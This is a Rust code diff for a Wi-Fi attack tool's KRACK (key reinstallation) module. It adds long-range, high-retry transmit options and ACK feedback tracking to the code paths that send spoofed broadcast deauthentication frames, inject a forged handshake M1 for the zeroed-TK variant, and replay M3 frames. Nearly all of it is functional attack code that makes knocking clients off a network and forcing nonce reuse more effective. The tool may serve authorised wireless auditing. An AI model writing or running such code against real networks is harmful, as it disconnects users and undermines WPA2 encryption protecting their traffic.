@@ -35,7 +35,7 @@ use std::thread;
 use std::time::{Duration, Instant};
 
 use crate::adapter::SharedAdapter;
-use crate::core::{EventRing, MacAddress, TxOptions};
+use crate::core::{EventRing, MacAddress, TxFlags, TxOptions, TxRate};
 use crate::store::Ap;
 use crate::protocol::frames;
 use crate::protocol::ieee80211::ReasonCode;
@@ -351,6 +351,10 @@ pub struct KrackInfo {
     pub start_time: Instant,
     pub elapsed: Duration,
     pub frames_per_sec: f64,
+
+    // === TX Feedback (ACK/NACK from firmware) ===
+    pub tx_feedback: crate::core::TxFeedbackSnapshot,
+
     pub results: Vec<KrackTestResult>,
 }
 
@@ -378,6 +382,7 @@ impl Default for KrackInfo {
             start_time: Instant::now(),
             elapsed: Duration::ZERO,
             frames_per_sec: 0.0,
+            tx_feedback: Default::default(),
             results: Vec::new(),
         }
     }
@@ -523,6 +528,15 @@ fn run_krack_attack(
 ) {
     let start = Instant::now();
     let _our_mac = shared.mac();
+    let tx_fb = shared.tx_feedback();
+    tx_fb.reset();
+    // TX options optimized for range — own MAC so ACK feedback works
+    let tx_opts = TxOptions {
+        rate: if target.channel <= 14 { TxRate::Cck1m } else { TxRate::Ofdm6m },
+        retries: 12,
+        flags: TxFlags::WANT_ACK | TxFlags::LDPC | TxFlags::STBC,
+        ..Default::default()
+    };
 
     push_event(events, start, KrackEventKind::AttackStarted {
         bssid: target.bssid,
@@ -551,7 +565,7 @@ fn run_krack_attack(
                 &target.bssid, &MacAddress::BROADCAST, &target.bssid,
                 ReasonCode::Class3FromNonAssoc,
             );
-            if shared.tx_frame(&deauth, &TxOptions::default()).is_ok() {
+            if shared.tx_frame(&deauth, &tx_opts).is_ok() {
                 let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                 info.frames_sent += 1;
                 info.deauths_sent += 1;
@@ -650,7 +664,7 @@ fn run_krack_attack(
 
         let result = test_variant(
             shared, reader, &target.bssid, *variant, params, &captured,
-            info, events, running, start,
+            info, events, running, start, &tx_opts,
         );
 
         total_tested += 1;
@@ -687,7 +701,7 @@ fn run_krack_attack(
                         &target.bssid, &MacAddress::BROADCAST, &target.bssid,
                         ReasonCode::Class3FromNonAssoc,
                     );
-                    let _ = shared.tx_frame(&deauth, &TxOptions::default());
+                    let _ = shared.tx_frame(&deauth, &tx_opts);
                     thread::sleep(params.deauth_delay);
                 }
 
@@ -726,6 +740,7 @@ fn run_krack_attack(
         if secs > 0.0 {
             info.frames_per_sec = (info.frames_sent + info.frames_received) as f64 / secs;
         }
+        info.tx_feedback = tx_fb.snapshot();
     }
 }
 
@@ -896,6 +911,7 @@ fn test_variant(
     events: &Arc<EventRing<KrackEvent>>,
     running: &Arc<AtomicBool>,
     attack_start: Instant,
+    tx_opts: &TxOptions,
 ) -> KrackTestResult {
     let test_start = Instant::now();
     let mut result = KrackTestResult::new(variant);
@@ -906,7 +922,7 @@ fn test_variant(
     // For zeroed-TK, inject forged M1 first
     if variant == KrackVariant::ZeroedTk {
         if let Some(m1) = &captured.m1 {
-            let _ = shared.tx_frame(m1, &TxOptions::default());
+            let _ = shared.tx_frame(m1, tx_opts);
             let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
             info.frames_sent += 1;
             thread::sleep(Duration::from_millis(10));
@@ -936,12 +952,11 @@ fn test_variant(
 
     // Replay the frame m3_replay_count times
     let mut replays_sent: u32 = 0;
-    let tx_opts = TxOptions::default();
 
     for i in 0..params.m3_replay_count {
         if !running.load(Ordering::SeqCst) { break; }
 
-        if shared.tx_frame(replay_frame, &tx_opts).is_ok() {
+        if shared.tx_frame(replay_frame, tx_opts).is_ok() {
             replays_sent += 1;
             let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
             info.frames_sent += 1;
